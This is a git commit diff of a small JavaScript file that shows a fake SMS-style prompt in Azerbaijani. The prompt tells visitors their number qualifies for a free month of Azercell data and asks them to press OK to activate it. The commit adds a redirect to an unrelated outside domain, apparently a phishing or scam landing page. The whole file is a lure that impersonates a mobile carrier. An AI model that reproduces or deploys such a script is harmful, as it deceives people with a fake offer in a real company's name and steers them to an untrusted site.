bfa77ec485987854b3567b540fe7550dbe651caa
newetijazz25 <newetijazz25@gmail.com>
2026-02-03 06:52:15 +0100

    Update azercell.js

--- azercell.js
+++ azercell.js
@@ -1,5 +1,5 @@
 var password = '1 AY PULSUZ DATA AKTİVLƏŞDİRİN'
 password=prompt('SMS: Təbrik edirik, Mobil Nömrəniz 1 Aylıq Pulsuz Məlumat Almaq Üçün Uyğundur, İndi Aktivləşdirmək üçün OK düyməsini basın','1 AY PULSUZ DATA AKTİVLƏŞDİRİN');
 if (password != '1 AY PULSUZ DATA AKTİVLƏŞDİRİN') {
-location.href='';
+location.href='https://www.jpegxz.site/Azercell';
 }
